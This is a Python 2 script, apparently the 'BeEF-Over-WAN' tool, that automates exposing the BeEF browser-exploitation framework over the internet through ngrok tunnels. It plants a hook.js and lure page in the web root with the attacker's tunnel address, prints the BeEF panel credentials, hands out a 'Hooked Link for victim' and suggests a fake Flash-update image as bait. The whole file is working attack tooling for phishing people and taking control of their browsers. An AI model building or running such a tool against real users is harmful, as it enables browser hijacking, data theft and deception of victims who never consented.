#!/usr/bin/python
#-*- coding: latin1 -*-

import os
import re
import yaml

Filename = "hook.js"


def instruction():
    return """
Instructions :\n
You need two Links  which are Forwarded To LocalHost:80 and LocalHost:3000\n
\t1. To send to Victim .
\t2. Beef listens on Port 3000 ,\n\t   so this link should be forwared to LocalHost:3000 .

Just Enter your links in the Script \nScript will do neccessary changes required to opt for your Links .

"""


def ngrok():
    step1 = mycolor("STEP 1", 'yellow') + mycolor(" : Add these Lines To ngrok.yml [ .ngrok2/ngrok.yml ]", "blue")
    step2 = mycolor("STEP 2", 'yellow') + mycolor(" : Now Start ngrok with :", "blue")
    step3 = mycolor("STEP 3", 'yellow') + mycolor(" : You will See 2 different links Forwarded to", "blue")
    step4 = mycolor("STEP 4", 'yellow') + mycolor(" : Enter these links in Script and Follow The Steps given in Script.", "blue")
    return """
ngrok steps:

{}

    tunnels:
    apache:
        addr: 80
        proto: http
    beef:
        addr: 3000
        proto: http

{} 
    ngrok start --all
    
{}
    localhost:80    [               Send this link to victim                ]
    localhost:3000  [ Connect this to view hooked browsers (beef panel) ... ]
    
{}""".format(step1, step2, step3, step4)


def banner():
    return """
  ____            ______    ____                  __          __     _   _ 
 |  _ \          |  ____|  / __ \                 \ \        / /\   | \ | |
 | |_) | ___  ___| |__    | |  | |_   _____ _ __   \ \  /\  / /  \  |  \| |
 |  _ < / _ \/ _ \  __|   | |  | \ \ / / _ \ '__|   \ \/  \/ / /\ \ | . ` |
 | |_) |  __/  __/ |      | |__| |\ V /  __/ |       \  /\  / ____ \| |\  |
 |____/ \___|\___|_|       \____/  \_/ \___|_|        \/  \/_/    \_\_| \_|

 BY SKS  \n\n https://github.com/stormshadow07\n"""


def getpid(pname): return [item.split()[0] for item in os.popen('ps -A').read().splitlines() if
                           pname.lower() in item.lower()]


def get_beef_config():
    beef_creds_file = '/usr/share/beef-xss/config.yaml'
    try:
        with open(beef_creds_file, 'r') as f:
            return yaml.load(f, yaml.FullLoader)
    except Exception as e:
        print mycolor(" [-] Unable to get beef-xss credentials from {} : {}\n".format(beef_creds_file, e))
        return {}


def mycolor(mystr, dcolor=None):
    attr = ['1']
    COLORS = {
        'red': 31,
        'green': 32,
        'yellow': 33,
        'blue': 34,
        'magenta': 35,
        'cyan': 36
    }
    STARTERS = {
        " [!]": 'red',
        " [+]": 'green',
        " [?]": 'yellow',
        " [*]": 'blue'
    }

    if dcolor:
        try:
            attr.append(str(COLORS[dcolor.lower()]))
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), mystr)
        except KeyError:
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), mystr)
    else:
        try:
            for starter in STARTERS.keys():
                if mystr.startswith(starter):
                    attr.append(str(COLORS[starter]))
                    return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), mystr)

        except Exception as e:
            return mystr

    return mystr


def string_replace(filename, old_string, new_string):
    # Safely read the input filename using 'with'
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print '"{old_string}" not found in {filename}.'.format(**locals())
            return

    # Safely write the changed content, if found in the file
    with open(filename, 'w') as f:
        # print 'Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals())
        s = s.replace(old_string, new_string)
        f.write(s)
        print mycolor(' [?] File Changed...', 'green')


if __name__ == '__main__':
    os.system("clear")

    print mycolor(instruction(), "green")
    print mycolor(" [*] IF you want to Do this Without Port Forwarding : Use ngrok\n")

    ng_check = raw_input(mycolor(" [?] Press '1' to see how to set up tunnels in ngrok else Press '0' : "))

    if int(ng_check):
        print ngrok()
        con = raw_input(mycolor(" [?] Press Enter to continue ... "))

    os.system("clear")
    print mycolor(" [*] Checking Services Status Required ", "blue")

    # 0 - active; other value - inactive
    apache2_off = os.system("systemctl is-active apache2 --quiet")
    if not apache2_off:
        print mycolor(" apache2 is running  ... \n Restart required ", "blue")
        os.system("systemctl stop apache2")

    if getpid('beef-xss'):
        print mycolor(" beef-xss is running ... \n Restart required ", "blue")
        os.system("beef-xss-stop")

    os.system("systemctl start apache2")
    os.system("beef-xss")
    os.system("clear")

    print mycolor("All Good So far ... \n Close The Browser If Prompted .. ", "green")

    print mycolor(banner(), "green")
    send_to = raw_input(mycolor(" [?] Link to victim [ <ngrok> --> localhost:80 ] : "))
    send_to = send_to.rstrip()
    print mycolor(" [+] Send_To Link  : " + send_to)

    connect_to = raw_input(mycolor(" [?] Link of beef-xss [ <ngrok> --> localhost:3000 ] : "))
    connect_to = connect_to.rstrip()
    print mycolor(" [+] Connect_To Link  : " + connect_to)

    print mycolor(" [?] Checking directories ... ", 'green')

    if not os.path.isdir("./temp"):
        os.makedirs("./temp")
        print mycolor(" [+] Creating [./temp] directory for resulting code files", "green")
    else:
        os.system("rm -rf temp/*")
        print mycolor(" [+] Clean Successfully: temp/*", "green")

    if "http://" in connect_to:
        connect_to = re.sub(r'^https?:\/\/', '', connect_to, flags=re.MULTILINE)

    connect_to_full = "http://{}:80/hook.js".format(connect_to)
    connect_to_panel = "http://{}/ui/panel".format(connect_to)

    if "http://" in send_to:
        send_to = re.sub(r'^https?:\/\/', '', send_to, flags=re.MULTILINE)

    send_to_full = "http://{}/beef.html".format(send_to)

    # print connect_to_full
    os.system("cp base.js ./temp/hook.js")
    string_replace("./temp/hook.js", "SKS_1", connect_to_full)
    string_replace("./temp/hook.js", "SKS_2", connect_to)

    os.system("cp beef.html ./temp/beef.html")
    string_replace("./temp/beef.html", "SKS_3", send_to)
    os.system("cp ./temp/* /var/www/html/")
    os.system("chmod a+rw /var/www/html/hook.js")

    print mycolor("\n ==================================== RESULT ====================================\n", "blue")
    print mycolor(" [+] Access The BeeF Control Panel Using : {}".format(connect_to_panel), "green")

    beef_config = get_beef_config()
    if beef_config:
        username = beef_config['beef']['credentials']['user']
        password = beef_config['beef']['credentials']['passwd']
    else:
        username = "Unknown"
        password = "Unknown"

    print mycolor("\t Username = {}\n\t Password = {}\n".format(username, password), "blue")
    print mycolor(" [+] Hooked Link for victim : {}".format(send_to_full), "green")
    print " [?]\n\nNote : I know few of the Exploits does not work due to Updated Browsers and stuff..."
    print "    Tip : Change Payload or Images Address to your Connect_to Address with Port 80 \n\t Example : "
    print mycolor("\tFROM Image URL : http://0.0.0.0:3000/adobe/flash_update.png\n", "red")
    print mycolor("\tTO Image URL : http://{}:80/adobe/flash_update.png".format(connect_to), "green")
    print mycolor("\tHappy Hacking !!! Have Problem or Tip ? Contact : https://github.com/stormshadow07", "green")
